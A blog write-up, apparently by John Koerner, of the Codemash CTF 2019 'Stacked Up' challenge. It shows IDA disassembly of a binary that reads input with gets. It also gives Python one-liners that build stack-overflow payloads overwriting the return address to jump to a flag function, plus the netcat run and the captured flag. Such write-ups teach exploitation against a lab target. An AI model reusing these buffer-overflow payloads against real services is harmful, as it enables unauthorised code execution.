---
layout: post
status: publish
published: true
title: Codemash CTF 2019 - Stacked Up
author:
  display_name: John Koerner
  login: admin
  email: blog@johnkoerner.net
  url: ''
author_email: blog@johnkoerner.net
categories:
- codemash
tags:
- codemash
- fun
---

Clue
---
A vulnerable service is running here:

`nc whale.hacking-lab.com 5777`

You have the binary of the service. Analyze it, find a vulnerability, and then exploit the server to get the flag!

[stack_binary.zip](/content/stack_binary.zip)

Hint
---
What happens if you input a veeeeeeeeeery long string?


Approach
---
Based on the name of this challenge and the hint, this appears to be a stackoverflow.  I opened this up in IDA and saw the main function code:

```
var_410= qword ptr -410h
var_404= dword ptr -404h
s= byte ptr -400h

push    rbp
mov     rbp, rsp
sub     rsp, 410h
mov     [rbp+var_404], edi
mov     [rbp+var_410], rsi
lea     rdi, s          ; "Input, please! >>----------> "
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+s]
mov     rdi, rax
mov     eax, 0
call    _gets
lea     rax, [rbp+s]
mov     rdi, rax        ; s
call    _puts
mov     eax, 0
leave
retn
main endp
```

There is also a function called `flag` in the binary, which reads a file called flag.txt:

```
push    rbp
mov     rbp, rsp
sub     rsp, 410h
lea     rsi, modes      ; "r"
lea     rdi, filename   ; "flag.txt"
call    _fopen
```

So our goal is to get this function called. Locally I created a flag.txt and then started hacking on the assembly.  The address for the flag function is `0x0000000000400676`.  Knowing that this is a 64-bit assembly is important to make sure we put the full address into the payload.

Looking at the main assembly, I see that s is allocated `0x400` or 1024 bytes. So I created a text file using a python script and decided to try and completely smash the stack:

`python -c "print '\x76\x06\x40\x00\x00\x00\x00\x00'*200" > payload.txt`

I piped the output of my payload to the local binary and got the contents of my `flag.txt`:

`cat payload.txt | ./stack`

So then I tried with `netcat` and got the result:

`cm19-jUmp-inUP-th3S-tACK`

*Note: After talking with others on this solution, a more targeted python script to overwrite a single instruction would be:

`python -c "print 'a'*1032 + '\x76\x06\x40\x00\x00\x00\x00\x00'" > payload.txt`

The extra 8 bytes move us far enough down the stack to overwrite the return address for the function.



[Return to the full breakdown of the Codemash CTF](/codemash/codemash-ctf-breakdown-2019/)